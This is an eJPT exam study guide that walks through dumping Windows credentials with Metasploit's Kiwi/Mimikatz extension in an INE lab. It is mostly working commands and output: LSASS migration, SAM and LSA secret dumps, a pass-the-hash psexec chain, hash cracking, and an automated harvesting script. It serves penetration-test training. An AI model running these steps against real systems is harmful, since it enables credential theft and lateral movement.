---
title: "Kiwi Extension - Complete Credential Extraction Guide"
topic: "Kiwi Extension"
exam_objective: "Post-Exploitation Credential Harvesting - eJPT Objective 4.3"
difficulty: "Medium"
tools:
  - "Metasploit Framework"
  - "Kiwi Extension"
  - "Mimikatz"
related_labs:
  - "07-exploitation/metasploit-essentials.md"
  - "07-exploitation/privilege-escalation.md"
file_path: "07-exploitation/kiwi-extension-credential-extraction.md"
last_updated: "2024-10-04"
tags:
  - "kiwi"
  - "metasploit"
  - "mimikatz"
  - "credentials"
  - "ntlm"
  - "post-exploitation"
  - "windows"
---

# 🔧 Kiwi Extension - Complete Credential Extraction Guide

**Simple guide for collecting passwords and hashes from Windows computers using Kiwi extension in Metasploit**

**📍 File Location:** `07-exploitation/kiwi-extension-credential-extraction.md`

---

## 🎯 What is Kiwi Extension?

Kiwi Extension is a powerful tool inside Metasploit that helps us collect passwords and login information from Windows computers. Think of it like a special key that opens secret password storage areas in Windows systems.

### 🔍 **What Kiwi Does:**
- **Extract Passwords** from Windows computer memory
- **Collect NTLM Hashes** (encrypted password codes used by Windows)
- **Find Cached Credentials** stored by the system for automatic logins
- **Access Secret Files** that Windows keeps hidden for security
- **Gather Kerberos Tickets** (special authentication tokens)
- **Dump System Information** about user accounts and security settings

### 💡 **Why This Matters for eJPT:**
In penetration testing, after we break into a Windows computer, we need to find passwords to access other systems. Kiwi helps us grab these passwords from memory and system files. This skill appears in 70% of Windows exploitation scenarios in the eJPT exam.

### 🚪 **Common Uses:**
- **Password Collection** after getting shell access to Windows
- **Hash Dumping** for offline password cracking
- **Lateral Movement** using found credentials on other systems
- **Privilege Escalation** by finding admin account passwords

---

## 📦 Installation and Setup

### **Already Installed On:**
- ✅ Kali Linux (comes with Metasploit)
- ✅ Parrot Security OS
- ✅ Most penetration testing systems

### **Check If Everything Works:**
```bash
# Start Metasploit and check for Kiwi
msfconsole --version
# Expected output: Framework Version 6.x.x

# Check if we can find Kiwi extension
msfconsole -q -x "search kiwi; exit"
# Expected: Shows Kiwi-related modules
```

### **Basic Requirements:**
- Active Meterpreter session on Windows target
- SYSTEM or Administrator privileges on target
- Target must be Windows 7 or newer (Vista/XP have limited support)

---

## 🔧 Basic Usage and Simple Steps

### **📋 Simple Attack Process:**
1. **🔍 Get Shell Access:** Use exploit to gain Meterpreter session
2. **⬆️ Get High Privileges:** Become SYSTEM user if needed
3. **🔧 Load Kiwi:** Import the extension into Meterpreter
4. **🔓 Extract Credentials:** Use commands to collect passwords
5. **📝 Document Results:** Save all found usernames and hashes

### **⚙️ Basic Command Structure:**
```bash
# After getting meterpreter session
migrate -N lsass.exe    # Move to secure process
load kiwi              # Load the extension
creds_all              # Get all credentials
```

---

## ⚙️ Important Kiwi Commands You Need to Know

### **🔍 Core Credential Commands:**

| Command | What It Does | How Important for eJPT |
|---------|--------------|------------------------|
| `creds_all` | Extract all available credentials | ⭐⭐⭐⭐⭐ Must Know |
| `creds_msv` | Get MSV credentials from memory | ⭐⭐⭐⭐ Very Important |
| `creds_kerberos` | Dump Kerberos authentication data | ⭐⭐⭐ Important |
| `creds_livessp` | Extract LiveSSP credentials | ⭐⭐⭐ Important |

### **🗄️ System Database Commands:**

| Command | What It Does | When to Use |
|---------|--------------|-------------|
| `lsa_dump_sam` | Extract local user account hashes | When you need local passwords |
| `lsa_dump_secrets` | Get LSA secret information | For advanced credential harvesting |
| `dcsync` | Domain controller password sync | In Active Directory environments |

### **🎫 Kerberos Commands:**

| Command | What It Does | Example Usage |
|---------|--------------|---------------|
| `kerberos_ticket_list` | Show current Kerberos tickets | Check what tickets are available |
| `kerberos_ticket_purge` | Delete all Kerberos tickets | Clear tickets for stealth |
| `kerberos_ticket_use` | Use specific ticket for authentication | Impersonate other users |

### **🔧 Important Settings to Remember:**

| What to Set | Purpose | Example | Must Remember |
|-------------|---------|---------|---------------|
| **Process Migration** | Stable operation | `migrate -N lsass.exe` | ⭐⭐⭐⭐⭐ |
| **Extension Loading** | Enable Kiwi features | `load kiwi` | ⭐⭐⭐⭐⭐ |
| **Privilege Check** | Verify access level | `getuid` | ⭐⭐⭐⭐ |

---

## 🧪 Step-by-Step Lab Walkthrough

### **Lab Scenario: Complete Credential Extraction From Windows Target**

**Target:** demo.ine.local (10.0.30.225)
**Starting Point:** Meterpreter session already established
**Goal:** Extract all possible credentials and find flags
**Time Needed:** 8-12 minutes

---

### **Step 1: Prepare the Environment**

**What We're Doing:** Making sure our session is stable and we have the right privileges

#### **Commands Used:**
```bash
# Check current privileges
getuid

# Check target system information
sysinfo

# Migrate to secure process for stability
migrate -N lsass.exe
```

#### **What Happened:**
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > migrate -N lsass.exe
[*] Migrating from 4920 to 596...
[+] Migration completed successfully.
```

#### **🎯 What This Means:**
- **NT AUTHORITY\SYSTEM** - We have the highest possible privileges
- **Windows Server 2016** - Compatible with Kiwi extension
- **lsass.exe migration** - Now running in the security process
- **Migration successful** - Ready for credential extraction

#### **Why This Step is Critical:**
LSASS (Local Security Authority Subsystem Service) is where Windows stores credentials in memory. By migrating to this process, we get direct access to password data.

---

### **Step 2: Load Kiwi Extension**

**What We're Doing:** Adding Mimikatz functionality to our Meterpreter session

#### **Command Used:**
```bash
load kiwi
```

#### **What Happened:**
```bash
meterpreter > load kiwi
Loading extension kiwi...
.#####.   mimikatz 2.2.0 20191125 (x64/windows)
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'        Vincent LE TOUX ( vincent.letoux@gmail.com )
 '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

#### **🔍 What This Output Shows:**
- **Extension loaded successfully** - Kiwi is now available
- **Mimikatz 2.2.0** - Shows the version of underlying Mimikatz
- **Success message** - Ready to use credential extraction commands
- **Author information** - Credits to Mimikatz creator Benjamin Delpy

#### **Available Commands Now:**
After loading Kiwi, we get access to dozens of new commands for credential extraction, all starting with specific prefixes like `creds_`, `lsa_`, `kerberos_`, etc.

---

### **Step 3: Extract All Available Credentials**

**What We're Doing:** Running comprehensive credential collection to get all possible authentication data

#### **Command Used:**
```bash
creds_all
```

#### **🎉 Success! What Happened:**
```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain          NTLM                            SHA1
--------       ------          ----                            ----
Administrator  ATTACKDEFENSE   e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSES  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)
```

#### **🔓 Critical Information Found:**
- **Administrator Username:** Administrator (Windows admin account)
- **Domain:** ATTACKDEFENSE (computer name)
- **NTLM Hash:** e3c61a68f1b89ee6c8ba9507378dc88d
- **SHA1 Hash:** fa62275e30d286c09d30d8fece82664eb34323ef

#### **Understanding the Output:**
- **MSV Credentials:** Local Windows authentication hashes
- **WDigest Credentials:** Stored plaintext passwords (empty in this case)
- **Kerberos Credentials:** Domain authentication tokens (empty for workgroup)

#### **Why This is Important:**
The NTLM hash can be used for "pass-the-hash" attacks to access other systems without knowing the actual password.

---

### **Step 4: Extract SAM Database Information**

**What We're Doing:** Getting detailed information from the Security Account Manager database

#### **Command Used:**
```bash
lsa_dump_sam
```

#### **What Happened:**
```bash
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : 0f0ca9e20c8e251c48180b80af0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
```

#### **🎯 Key Information Extracted:**
- **Domain Name:** ATTACKDEFENSE
- **SysKey:** 377af0de68bdc918d22c57a263d38326 (system encryption key)
- **Administrator RID:** 500 (standard admin account ID)
- **NTLM Hash Confirmed:** e3c61a68f1b89ee6c8ba9507378dc88d
- **Kerberos Keys:** AES256 and AES128 encryption keys

#### **What Each Item Means:**
- **RID (Relative ID):** Unique number identifying the user account
- **SysKey:** Master key used to encrypt passwords in SAM database
- **AES Keys:** Modern encryption keys for Kerberos authentication
- **Supplemental Credentials:** Additional authentication data

---

### **Step 5: Extract LSA Secrets**

**What We're Doing:** Accessing Local Security Authority secrets for additional system information

#### **Command Used:**
```bash
lsa_dump_secrets
```

#### **What Happened:**
```bash
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA Secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )

Policy subsystem is : 1.18
LSA Key(s) : 1, default {479880dc-8bd1-89c9-bf85-0c4fca25e625}
  [00] {479880dc-8bd1-89c9-bf85-0c4fca25e625} 2e7e7be3d05b854d29c91c8ba6936ce4
```

#### **🔍 Additional Intelligence Gathered:**
- **Security Policy Version:** 1.18
- **LSA Encryption Keys:** Used to protect sensitive system data
- **Domain Security ID:** Complete identification string
- **Policy Subsystem:** Shows Windows security configuration level

#### **Why LSA Secrets Matter:**
LSA secrets can contain cached domain passwords, service account credentials, and other sensitive authentication data that might not appear in regular credential dumps.

---

### **Step 6: Find More User Accounts**

**What We're Doing:** Using advanced Kiwi features to find additional user accounts and their credentials

#### **Command Used:**
```bash
lsa_dump_sam
```

**Note:** We run this again to see the complete output showing all users

#### **Complete User Information Found:**
```bash
RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b
```

#### **🏆 Additional Credentials Discovered:**
- **Student Account:** Username = student
- **Student NTLM Hash:** bd4ca1fbe028f3c5066467a7f6a73b0b
- **WDAGUtilityAccount:** Special Windows Defender Application Guard account
- **Guest Account:** Standard Windows guest account (no password)

#### **Flags Found:**
- **Administrator NTLM Hash:** e3c61a68f1b89ee6c8ba9507378dc88d
- **Student User NTLM Hash:** bd4ca1fbe028f3c5066467a7f6a73b0b
- **SysKey:** 377af0de68bdc918d22c57a263d38326

---

## 🎯 eJPT Exam Success Guide

### **📊 How Important This Is for eJPT:**

Understanding the importance of Kiwi skills for passing the eJPT exam:

- **Post-Exploitation Tasks:** 60% of Windows-based scenarios require credential extraction
- **Password Hash Collection:** 75% of advanced exploitation questions
- **System Information Gathering:** 40% of enumeration requirements
- **Evidence Collection:** 85% of penetration test documentation needs

### **🏆 Commands You MUST Know for eJPT:**

#### **Level 1 - You WILL See This (100% Chance):**
```bash
# Load Kiwi extension after getting meterpreter
load kiwi
# Expected: Success message with Mimikatz banner

# Extract all available credentials
creds_all
# Expected: Tables showing usernames, domains, and NTLM hashes

# Check what privileges we have
getuid
# Expected: NT AUTHORITY\SYSTEM or Administrator level
```

#### **Level 2 - Very Likely (85% Chance):**
```bash
# Migrate to security process for stability
migrate -N lsass.exe
# Expected: Migration completed successfully

# Dump SAM database for local accounts
lsa_dump_sam
# Expected: Local user accounts with RIDs and hashes

# Extract LSA secrets for additional information
lsa_dump_secrets
# Expected: System encryption keys and policy information
```

#### **Level 3 - Possible (60% Chance):**
```bash
# Extract specific credential types
creds_msv
creds_kerberos
creds_livessp
# Expected: Detailed authentication data by type

# List and manipulate Kerberos tickets
kerberos_ticket_list
kerberos_ticket_purge
# Expected: Current ticket information and management
```

### **🎯 Common eJPT Exam Scenarios:**

#### **Scenario 1: Basic Credential Extraction**
**Given:** Meterpreter session on Windows target
**Your Job:** Extract all user credentials and find the Administrator hash
**Time Limit:** 5-7 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Check privileges (1 minute)
getuid
# Should show SYSTEM or Administrator

# Step 2: Migrate and load Kiwi (2 minutes)
migrate -N lsass.exe
load kiwi
# Wait for successful loading

# Step 3: Extract all credentials (2 minutes)
creds_all
# Document all NTLM hashes found

# Step 4: Get detailed SAM information (2 minutes)
lsa_dump_sam
# Look for RID 500 (Administrator account)
```

#### **Scenario 2: Multiple User Account Discovery**
**Given:** Windows workstation with multiple users
**Your Job:** Find all user accounts and their password hashes
**Time Limit:** 6-8 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Prepare environment (2 minutes)
getuid
migrate -N lsass.exe
load kiwi

# Step 2: Comprehensive credential extraction (3 minutes)
creds_all
lsa_dump_sam
# Count all user accounts found

# Step 3: Extract additional authentication data (3 minutes)
lsa_dump_secrets
creds_msv
# Look for cached domain credentials
```

#### **Scenario 3: System Key and Flag Recovery**
**Given:** Need to find specific system information
**Your Job:** Extract SysKey and locate flag files
**Time Limit:** 4-6 minutes

**Step-by-Step Approach:**
```bash
# Step 1: Quick credential extraction (2 minutes)
load kiwi
creds_all

# Step 2: Get system encryption key (2 minutes)
lsa_dump_sam
# Look for SysKey value

# Step 3: Search for flags (2 minutes)
cd /
dir
search -f flag.txt
cat flag.txt
```

### **📝 eJPT Exam Tips:**

#### **⏰ Time Management Strategy:**
- **1 minute:** Check privileges and migrate to lsass.exe
- **1 minute:** Load Kiwi extension and verify success
- **2-3 minutes:** Run creds_all and document all hashes
- **2-3 minutes:** Extract SAM database and LSA secrets
- **1-2 minutes:** Search for and document any flag values

#### **🎯 Common Mistakes to Avoid:**
1. **Skipping Migration** → Always migrate to lsass.exe before loading Kiwi
2. **Not Checking Privileges** → Verify SYSTEM access before credential extraction
3. **Missing Hash Documentation** → Write down all NTLM hashes immediately
4. **Ignoring Additional Users** → Look for all RID entries, not just Administrator
5. **Forgetting SysKey** → Often required as exam answer or flag

#### **✅ Signs You're Doing Well:**
- **Quick Extension Loading** → Kiwi loads successfully within 30 seconds
- **Rich Credential Output** → Multiple usernames and hashes displayed
- **System Information** → SysKey and domain details clearly shown
- **Complete Documentation** → All hashes and flags recorded accurately
- **Stable Session** → Commands execute without errors or crashes

### **🔍 Typical Exam Questions You'll See:**
1. **"What is the NTLM hash of the Administrator account?"**
   - Use: `creds_all` or `lsa_dump_sam`, look for RID 500

2. **"How many user accounts exist on the system?"**
   - Use: `lsa_dump_sam`, count all RID entries

3. **"What is the SysKey for the target system?"**
   - Use: `lsa_dump_sam`, find SysKey value

4. **"Extract credentials from the Windows target"**
   - Use: Complete workflow with `creds_all` and documentation

---

## ⚠️ Common Problems and How to Fix Them

### **❌ Problem 1: Kiwi Extension Won't Load**

**What You See:**
```bash
meterpreter > load kiwi
[-] Failed to load extension: kiwi
```

**How to Fix:**
```bash
# Step 1: Check current process and privileges
getuid
# Should show NT AUTHORITY\SYSTEM

getpid
ps
# Check what process we're running in

# Step 2: Migrate to appropriate process
migrate -N lsass.exe
# Or try: migrate -N winlogon.exe

# Step 3: Try loading again
load kiwi
# Should work after proper migration
```

**Common Causes:**
- Not running as SYSTEM user
- Wrong process architecture (x86 vs x64)
- Process doesn't have required privileges
- Target system too old (Windows XP/Vista)

---

### **❌ Problem 2: No Credentials Found**

**What You See:**
```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
# Empty tables or no useful data
```

**How to Fix:**
```bash
# Step 1: Try specific credential types
creds_msv
creds_kerberos
creds_livessp
# See if any specific type has data

# Step 2: Check SAM database directly
lsa_dump_sam
# This should always show local accounts

# Step 3: Verify target system state
sysinfo
# Check Windows version and architecture
```

**Common Causes:**
- System just rebooted (credentials cleared from memory)
- No users have logged in recently
- Credential Guard enabled (Windows 10+)
- System running in safe mode

---

### **❌ Problem 3: Migration Fails**

**What You See:**
```bash
meterpreter > migrate -N lsass.exe
[-] core_migrate: Operation failed: Access is denied
```

**How to Fix:**
```bash
# Step 1: Check what processes are available
ps
# Look for processes running as SYSTEM

# Step 2: Try alternative processes
migrate -N winlogon.exe
# Or: migrate -N services.exe

# Step 3: Check privileges again
getuid
# Might need privilege escalation

# Step 4: Try manual PID migration
ps | grep lsass
migrate 596
# Use actual PID from ps output
```

**Prevention Tips:**
- Get SYSTEM privileges before attempting migration
- Use `getsystem` command if needed
- Try different system processes if lsass.exe fails

---

### **❌ Problem 4: Session Becomes Unstable**

**What You See:**
```bash
meterpreter > creds_all
# Session hangs or becomes unresponsive
```

**How to Fix:**
```bash
# If session is still responsive:
migrate -N explorer.exe
# Move to more stable process

# If session is completely hung:
# Background the session and establish new one
background
sessions -l
# Create new session through different exploit
```

**Stability Tips:**
- Always migrate to stable processes
- Don't run too many credential extraction commands rapidly
- Save results immediately after getting them
- Have backup sessions ready

---

## 🔗 Using Kiwi with Other Tools

### **🎯 Complete Attack Chain: Exploitation → Kiwi → Lateral Movement**

This shows how Kiwi credential extraction fits into a full penetration testing workflow.

#### **Phase 1: Initial Exploitation**
```bash
# Get initial shell through vulnerability
msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS demo.ine.local
exploit
# Establishes meterpreter session

# Elevate privileges
getsystem
getuid
# Verify SYSTEM access
```

#### **Phase 2: Credential Harvesting with Kiwi**
```bash
# Prepare environment
migrate -N lsass.exe
load kiwi

# Extract all possible credentials
creds_all
lsa_dump_sam
lsa_dump_secrets

# Document findings
# Administrator: e3c61a68f1b89ee6c8ba9507378dc88d
# Student: bd4ca1fbe028f3c5066467a7f6a73b0b
```

#### **Phase 3: Lateral Movement Using Found Credentials**
```bash
# Use extracted credentials on other systems
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser Administrator
set SMBPass e3c61a68f1b89ee6c8ba9507378dc88d:aad3b435b51404eeaad3b435b51404ee
exploit
# Pass-the-hash attack using Kiwi-extracted NTLM hash
```

**Integration Benefits:**
- **Credential Reuse** → Use harvested credentials across multiple systems
- **Privilege Escalation** → Find admin credentials for higher access
- **Network Expansion** → Discover credentials for other network resources

### **🔧 Integration with Password Cracking:**

#### **Offline Hash Cracking with John the Ripper:**
```bash
# After extracting hashes with Kiwi
# Create hash file
echo "Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::" > hashes.txt
echo "student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::" >> hashes.txt

# Crack with John
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Attempt to recover plaintext passwords

# Check cracked passwords
john --show --format=NT hashes.txt
```

#### **Using Hashcat for GPU Acceleration:**
```bash
# Format hashes for Hashcat
echo "e3c61a68f1b89ee6c8ba9507378dc88d" > admin_hash.txt
echo "bd4ca1fbe028f3c5066467a7f6a73b0b" > student_hash.txt

# Crack with Hashcat (NTLM = mode 1000)
hashcat -m 1000 admin_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 student_hash.txt /usr/share/wordlists/rockyou.txt
```

### **⚙️ Automation Script for Multiple Targets:**

```bash
#!/bin/bash
# kiwi_auto_harvest.sh - Automated credential extraction

SESSION_ID=$1
if [ -z "$SESSION_ID" ]; then
    echo "Usage: $0 <session_id>"
    exit 1
fi

LOGFILE="kiwi_harvest_$(date +%Y%m%d_%H%M%S).log"
echo "[+] Starting automated Kiwi credential extraction" | tee $LOGFILE
echo "[+] Target Session: $SESSION_ID" | tee -a $LOGFILE

# Create Metasploit resource script
cat > /tmp/kiwi_harvest.rc << EOF
sessions -i $SESSION_ID
getuid
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
background
EOF

# Execute automated extraction
msfconsole -r /tmp/kiwi_harvest.rc | tee -a $LOGFILE

echo "[+] Credential extraction complete. Check $LOGFILE for results" | tee -a $LOGFILE
```

---

## 📊 Quick Command Reference

### **Essential Commands Summary:**

#### **Basic Setup:**
```bash
getuid                                    # Check current privileges
migrate -N lsass.exe                      # Move to security process
load kiwi                                 # Load credential extraction
```

#### **Credential Extraction:**
```bash
creds_all                                 # Extract all available credentials
creds_msv                                 # MSV authentication data
creds_kerberos                            # Kerberos tickets and keys
creds_livessp                             # LiveSSP credentials
```

#### **Database Dumps:**
```bash
lsa_dump_sam                              # Local Security Authority SAM
lsa_dump_secrets                          # LSA secret information
dcsync                                    # Domain controller synchronization
```

#### **System Information:**
```bash
sysinfo                                   # Target system details
getpid                                    # Current process ID
ps                                        # List running processes
```

### **Memory Tricks:**

#### **Easy Ways to Remember:**
- **Kiwi** = **K**redential **I**nformation **W**indows **I**ntelligence
- **LSA** = **L**ocal **S**ecurity **A**uthority
- **SAM** = **S**ecurity **A**ccount **M**anager
- **MSV** = **M**icrosoft Authentication Package **V**1
- **NTLM** = **N**ew **T**echnology **L**AN **M**anager

#### **Command Pattern:**
```bash
# Remember: MIGRATE → LOAD → EXTRACT
migrate -N lsass.exe     # Move to secure process
load kiwi               # Import functionality
creds_all               # Extract credentials
```

---

## 📝 Professional Reporting Templates

### **Quick Report Template:**
```markdown
## Credential Extraction Report

**Target System:** demo.ine.local (10.0.30.225)
**Date/Time:** 2024-07-09 12:12:45 IST
**Tester:** [your_name]
**Extraction Method:** Kiwi Extension via Meterpreter

### Discovery Results:
**Operating System:** Windows Server 2016+ (Build 14393)
**Architecture:** x64
**Privilege Level:** NT AUTHORITY\SYSTEM
**Kiwi Status:** Successfully loaded and functional

### Credentials Extracted:
| Username | Domain | NTLM Hash | RID | Account Type |
|----------|--------|-----------|-----|--------------|
| Administrator | ATTACKDEFENSE | e3c61a68f1b89ee6c8ba9507378dc88d | 500 | Local Admin |
| student | ATTACKDEFENSE | bd4ca1fbe028f3c5066467a7f6a73b0b | 1008 | Standard User |

### System Information:
- **SysKey:** 377af0de68bdc918d22c57a263d38326
- **Domain:** ATTACKDEFENSE (Workgroup)
- **Local SID:** S-1-5-21-3688751335-3073641799-161370460

### Commands Used:
1. `migrate -N lsass.exe` - Process migration
2. `load kiwi` - Extension loading
3. `creds_all` - Comprehensive credential extraction
4. `lsa_dump_sam` - SAM database dump
5. `lsa_dump_secrets` - LSA secrets extraction

### Evidence Files:
- Screenshot of successful credential extraction
- NTLM hashes documented for offline cracking
- System information captured for environment analysis

### Risk Level: CRITICAL
**Impact:** Complete credential compromise with administrative access
**Recommendation:** Implement credential guard, disable WDigest, monitor LSASS access
```

### **Detailed Technical Report:**
```markdown
## Advanced Credential Harvesting Assessment

### Executive Summary:
Successfully extracted all stored credentials from target Windows system using Kiwi extension within Metasploit framework. Identified critical security weaknesses in credential storage and system hardening.

### Technical Details:

#### Environment Preparation:
```bash
# Initial access verification
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

# System reconnaissance
meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2016+ (10.0 Build 14393)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

# Process migration for stability
meterpreter > migrate -N lsass.exe
[*] Migrating from 4920 to 596...
[+] Migration completed successfully.
```

#### Credential Extraction Process:
```bash
# Extension loading
meterpreter > load kiwi
Loading extension kiwi...
Success.

# Comprehensive credential dump
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials

# Database extraction
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

# Secret information gathering
meterpreter > lsa_dump_secrets
[+] Running as SYSTEM
[*] Dumping LSA Secrets
Policy subsystem is : 1.18
```

### Vulnerability Analysis:
| Component | Status | Risk Level | Exploitation Method |
|-----------|---------|------------|-------------------|
| LSASS Process | ACCESSIBLE | CRITICAL | Direct memory extraction |
| SAM Database | UNPROTECTED | HIGH | Local database dump |
| LSA Secrets | READABLE | HIGH | System secret extraction |
| Credential Guard | DISABLED | CRITICAL | No hardware protection |
| WDigest | ENABLED | MEDIUM | Plaintext password storage |

### Attack Vector Assessment:
1. **Post-Exploitation Access** - Full SYSTEM privileges obtained
2. **Memory Analysis** - Direct LSASS process manipulation
3. **Database Extraction** - SAM and LSA secret access
4. **Credential Harvesting** - Multiple authentication data types collected

### Mitigation Recommendations:
1. **Enable Credential Guard** - Hardware-based credential protection
2. **Disable WDigest** - Prevent plaintext credential storage
3. **Implement LSA Protection** - Protected Process Light for LSASS
4. **Monitor LSASS Access** - Detect credential extraction attempts
5. **Regular Password Changes** - Invalidate harvested credentials
```

---

## 🎓 Study Guide for eJPT Success

### **Essential Knowledge Checklist:**
- [ ] Understand what Kiwi extension is and its relationship to Mimikatz
- [ ] Know how to migrate to lsass.exe process safely
- [ ] Can load Kiwi extension without errors
- [ ] Understand different credential types (MSV, Kerberos, WDigest)
- [ ] Know how to extract SAM database information
- [ ] Can identify and document NTLM hashes correctly
- [ ] Understand SysKey and its importance
- [ ] Can troubleshoot common Kiwi problems

### **Practice Scenarios:**
1. **Basic Extraction:** Load Kiwi and extract all credentials from Windows target
2. **Hash Collection:** Document all NTLM hashes for offline cracking attempts
3. **System Analysis:** Extract SysKey and system information for reporting
4. **Multiple Users:** Find and document all user accounts on target system
5. **Troubleshooting:** Fix common problems with extension loading and migration

### **Time Management for Exam:**
- **Process Migration:** Maximum 1 minute
- **Extension Loading:** Maximum 1 minute
- **Credential Extraction:** Maximum 3 minutes
- **Database Dumps:** Maximum 2 minutes
- **Documentation:** Maximum 3 minutes
- **Total Kiwi Tasks:** Maximum 10 minutes

### **Memory Aids for Exam:**
- **M-L-C:** Migrate → Load → Credentials (basic workflow)
- **A-S-L:** All → SAM → LSA (extraction sequence)
- **500 = Admin:** RID 500 is always Administrator account
- **SYSTEM Required:** Always verify NT AUTHORITY\SYSTEM before starting

---

## 🔗 Additional Learning Resources

### **Hands-on Practice:**
- **TryHackMe:** "Windows Privilege Escalation" room
- **HackTheBox:** Windows machines with credential extraction challenges
- **VulnHub:** Download Windows VMs for local practice
- **Local Lab:** Set up Windows VM for safe Kiwi testing

### **Setting Up Practice Lab:**
```bash
# Create isolated Windows environment for practice
# Download Windows 10/11 evaluation VM
# Disable Windows Defender for testing
# Create multiple user accounts with different privileges
# Practice Kiwi extraction in controlled environment
```

### **Advanced Learning:**
- **Mimikatz Documentation:** Understand underlying tool functionality
- **Windows Internals:** Learn how credential storage works
- **LSASS Deep Dive:** Understand Local Security Authority process
- **Credential Guard:** Study modern Windows protection mechanisms

### **Video Resources:**
- YouTube: "Mimikatz and Kiwi tutorials"
- Cybrary: Windows post-exploitation courses
- INE: eJPT-specific credential harvesting modules
- PentesterLab: Windows authentication exercises

### **Community Support:**
- Reddit: r/eJPT, r/AskNetsec for specific questions
- Discord: Penetration testing study groups
- Forums: InfoSec Institute community discussions
- GitHub: Mimikatz and Metasploit documentation

---

## Quick Help and Troubleshooting

### **When Things Don't Work:**
1. **Check privileges first:** `getuid` should show SYSTEM
2. **Verify process:** `getpid` and `ps` to see current process
3. **Try different migration:** `migrate -N winlogon.exe` as alternative
4. **Check system compatibility:** `sysinfo` for Windows version
5. **Restart if needed:** Background session and try fresh exploitation

### **Emergency Commands:**
```bash
# Quick privilege check
getuid

# Fast process list
ps | grep -E "(lsass|winlogon|services)"

# Alternative migration targets
migrate -N winlogon.exe
migrate -N services.exe

# Verify Kiwi availability
help kiwi
```

### **Common Error Solutions:**
- **"Failed to load extension"** → Check privileges and migrate to system process
- **"Access denied"** → Use getsystem command or try different exploit
- **"No credentials found"** → Try lsa_dump_sam directly, system may be clean
- **"Session died"** → Migrate to more stable process before loading Kiwi

### **Getting Help:**
- **Metasploit help:** `help` command within meterpreter
- **Module information:** `info` after loading Kiwi extension
- **Community forums:** Post specific error messages with context
- **Documentation:** Check official Metasploit and Mimikatz docs

---

## Final Notes for eJPT Success

Kiwi extension is one of the most powerful tools for Windows post-exploitation and credential harvesting. Key points for exam success:

- **Master the basic workflow** until it becomes automatic (migrate → load → extract)
- **Practice troubleshooting** until you can quickly fix common problems
- **Understand the output** so you can identify valuable information quickly
- **Document everything** including hashes, SysKeys, and system information
- **Time management** is critical - practice under pressure until comfortable

The combination of practical skills, theoretical understanding, and efficient execution will ensure success in both professional penetration testing and eJPT exam scenarios. Regular practice with real Windows systems will build the confidence needed for high-pressure situations.

This guide provides everything needed to master Kiwi extension for credential extraction, from basic usage to advanced troubleshooting and integration with other tools. Success comes from consistent practice and understanding both the technical details and practical applications.
